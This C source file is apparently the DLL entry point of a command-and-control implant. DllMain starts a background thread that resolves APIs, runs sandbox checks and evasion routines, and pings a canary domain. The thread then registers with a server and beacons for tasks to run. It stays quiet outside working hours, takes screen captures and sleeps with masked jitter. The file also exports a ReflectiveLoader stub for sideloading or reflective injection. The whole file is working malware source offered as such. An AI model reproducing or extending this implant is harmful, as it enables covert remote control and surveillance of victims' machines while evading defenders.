/* DLL entry point for the C agent.
 * Compile with -shared instead of -mwindows.
 * DllMain spawns the agent loop in a background thread so it returns
 * immediately — running agent code inside DllMain causes loader-lock deadlock.
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "config.h"
#include "transport.h"
#include "commands.h"
#include "evasion.h"
#include "api_resolve.h"

static DWORD WINAPI agent_thread(LPVOID param) {
    (void)param;

    api_init();
    sandbox_check();
    evasion_init();

    if (AGENT_CANARY_DOMAIN[0] != '\0') {
        WSADATA wsa = {0};
        if (WSAStartup(MAKEWORD(2,2), &wsa) == 0) {
            struct addrinfo hints = {0}, *res = NULL;
            getaddrinfo("canary." AGENT_CANARY_DOMAIN, NULL, &hints, &res);
            if (res) freeaddrinfo(res);
        }
    }

    while (!agent_register()) {
        sleep_masked(30000);
    }

    for (;;) {
        if (!in_working_hours()) {
            sleep_until_work_hours();
            continue;
        }
        int count = 0;
        AgentTask *tasks = agent_beacon(&count);
        for (int i = 0; i < count; i++) {
            dispatch_task(&tasks[i]);
        }
        tasks_free(tasks, count);
        screenwatch_tick();
        sleep_masked(sleep_ms_jitter());
    }
    return 0;
}

/* Neutral export for sideloading / reflective injection (ordinal 1). */
__declspec(dllexport) void ReflectiveLoader(void) {}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    (void)hInst; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        HANDLE ht = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL);
        if (ht) CloseHandle(ht);
    }
    return TRUE;
}
